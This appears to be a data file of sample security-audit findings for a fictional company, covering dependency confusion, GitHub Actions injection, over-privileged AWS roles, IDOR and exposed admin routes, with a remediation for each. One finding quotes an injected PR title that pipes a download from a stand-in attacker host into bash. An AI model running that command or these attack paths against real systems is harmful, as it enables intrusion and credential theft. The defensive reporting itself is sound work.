findings.title: Fake version of your internal library uploaded to PyPI
findings.description: Someone outside your company uploaded a counterfeit copy of your private Python library to the public package registry (PyPI). The fake version has a higher version number than yours.
findings.businessImpact: Every developer and every automated build will silently install the attacker's code instead of your own — giving the attacker full access to your servers, secrets, and customer data.
findings.technical: acme-internal-auth@2.1.4 published to public PyPI by unknown@proton.me. Internal version is 2.1.3 — pip always prefers the higher version number.
findings.remediation: Lock all internal packages with hash verification (--require-hashes) and configure pip to only pull from your private registry.

findings.title: Counterfeit UI library on npm — 3 days old
findings.description: A fake copy of your front-end component library was published to the public npm registry just three days ago. It has a higher version number so npm will download it instead of yours.
findings.businessImpact: Your next production deployment will bundle the attacker's code directly into your website, affecting every visitor. This could steal user sessions, payment info, or install malware.
findings.technical: @acme/ui-components@4.2.1 on public npm (maintainer: acme-security-test). Internal version 4.1.9 — attacker version wins version resolution.
findings.remediation: Force npm to use your private registry with --registry. Lock the lockfile and enable npm audit signatures.

findings.title: Anyone with a pull request can hijack your build servers
findings.description: Your automated build system passes pull request titles directly into shell commands without any safety checks. An attacker just needs to open a PR with a malicious title to take over your servers.
findings.businessImpact: External contributor opens a PR titled "; curl attacker.io/malware | bash" → your build servers execute it → all AWS keys, database passwords, and API tokens are stolen.
findings.technical: run: echo "${{ github.event.pull_request.title }}" — unsanitised GitHub Actions expression injection. PR titles are attacker-controlled input.
findings.remediation: Never use ${{ }} expressions inside run: steps. Assign to an environment variable first: env: PR_TITLE: ${{ github.event.pull_request.title }}, then use $PR_TITLE.

findings.title: AWS production credentials fully accessible if pipeline is hijacked
findings.description: If an attacker hijacks the build pipeline (finding above), they automatically get your AWS production credentials with administrator-level access to your entire cloud environment.
findings.businessImpact: 47 storage buckets, 3 production databases, and 12 serverless functions compromised. Complete data breach. Attackers can also delete infrastructure or cause an outage.
findings.technical: AWS_ACCESS_KEY_ID maps to arn:aws:iam::123456789012:role/prod-deployer with s3:*, rds:*, secretsmanager:* — no least-privilege applied. Long-lived credentials in CI environment.
findings.remediation: Rotate AWS keys immediately. Switch to OIDC federation (keyless auth) for CI. Apply least-privilege IAM — only the permissions each job actually needs.

findings.title: Entire GitHub organisation exposed if any workflow is compromised
findings.description: Your CI workflow has "write everything" permissions. If any part of the pipeline is compromised, the attacker gets write access to every repository, package, and secret in your company.
findings.businessImpact: Lateral movement across all engineering repos, ability to push malicious code to any branch, access to every organisation secret and deployment key.
findings.technical: permissions: write-all on a PR-triggered workflow. Any fork PR triggers this with full org-level write access via GITHUB_TOKEN.
findings.remediation: Apply minimum-required permissions per workflow: contents: read, pull-requests: write. Never use write-all on externally triggered workflows.

findings.title: Admin panel with no login — lists all customer accounts
findings.description: A hidden admin page was found embedded in the app's JavaScript code. Anyone on the internet can visit this URL and get a complete list of all customer accounts — no login required.
findings.businessImpact: Full customer database exposed: names, emails, account IDs, and roles — for every single user on the platform. No authentication whatsoever.
findings.technical: GET /api/v2/admin/users returns HTTP 200 + full user array with no Authorization header. Route found by extracting strings from minified JS bundle.
findings.remediation: Authenticate every admin route at the middleware level, not per-handler. Add route inventory to your security review checklist so hidden routes can't go unnoticed.

findings.title: Any logged-in user can read any other user's personal data
findings.description: The system doesn't check that you're only allowed to see your own account. User #1 can simply change the number in the URL to read User #9,999's private details.
findings.businessImpact: Complete customer PII breach: names, emails, phone numbers, billing addresses, dates of birth — for every account on the platform. A single attacker can scrape everything.
findings.technical: GET /api/v2/users/9999 authenticated as user 1337 → HTTP 200 with full PII. No server-side ownership check. IDOR (Insecure Direct Object Reference) confirmed.
findings.remediation: Add server-side ownership check before every data response: assert request.user.id === resource.owner_id. Never rely on the client to send the right ID.

findings.title: Order history readable across all accounts — includes payment details
findings.description: Customers can read each other's order history by simply changing the order ID in a request. This includes partial payment card numbers and delivery addresses.
findings.businessImpact: Card last-4 digits, full shipping addresses, and complete purchase history exposed for every customer. Useful for targeted fraud and phishing attacks.
findings.technical: GET /api/v1/orders/{id} — no user_id filter in query. Returns card_last4, shipping_address, line_items for arbitrary IDs. Tested across 50 random IDs, all returned 200.
findings.remediation: Always filter order queries by authenticated user ID at the database level: SELECT * FROM orders WHERE id=$1 AND user_id=$2.

findings.title: 6 undocumented API endpoints discovered — 3 have no authentication
findings.description: Six API routes were hidden inside the app's code but never listed in any documentation. Attackers specifically hunt for these "shadow" routes because they're often forgotten and unprotected.
findings.businessImpact: Each undocumented endpoint is an unguarded attack surface. One of them (/api/debug/config) returns server environment variables including internal hostnames and config values.
findings.remediation: Audit all routes against your API gateway config. Remove all /debug/ endpoints from production builds. Add a route inventory step to your security review process.

findings.title: File upload leads to full production database breach
findings.description: Your file upload storage is publicly writable. An attacker can upload a specially crafted file that triggers your processing system, which then automatically hands over the database password.
findings.businessImpact: Complete database breach — 4.2 million user records fully exfiltrated, starting from nothing more than a file upload. No credentials needed to begin the attack.
findings.technical: S3 ACL: public-read-write → triggers aws_lambda_function.processor (IAM: s3:*, rds:*, secretsmanager:GetSecretValue) → reads prod DB credentials from Secrets Manager → direct DB access.
findings.remediation: Restrict S3 uploads to authenticated users only. Apply least-privilege to Lambda IAM role: s3:GetObject on specific prefix only, remove rds:* and secretsmanager:* entirely.

findings.title: Cloud function has administrator keys to your entire AWS account
findings.description: Your file-processing function was given administrator-level access to your entire cloud environment. If this function is ever compromised, the attacker inherits full control of everything.
findings.businessImpact: Complete AWS environment takeover — all storage, all databases, all secrets, all other functions. An attacker who compromises this function owns your entire cloud.
findings.technical: IAM policy: Action: ["s3:*","rds:*","secretsmanager:*","lambda:*","ec2:*"] Resource: "*" — wildcard on all actions and all resources. Violates principle of least privilege.
findings.remediation: Restrict to minimum required actions on specific resource ARNs. Use IAM permission boundaries. Run AWS IAM Access Analyzer to continuously detect over-privilege.

findings.title: Production database accepts connections from the entire internet
findings.description: Your production database is configured to accept connections from any IP address in the world, not just your own servers. If an attacker obtains credentials, they can connect directly.
findings.businessImpact: With credentials (found via the attack path above), the database can be directly queried from anywhere. No need to compromise internal systems first.
findings.technical: Security group ingress: cidr_blocks = ["0.0.0.0/0"] on port 5432. Should be restricted to VPC CIDR 10.0.0.0/16 or specific application subnet.
findings.remediation: Update security group to restrict PostgreSQL access to your VPC CIDR only. Consider RDS Proxy with IAM authentication to eliminate password-based access entirely.
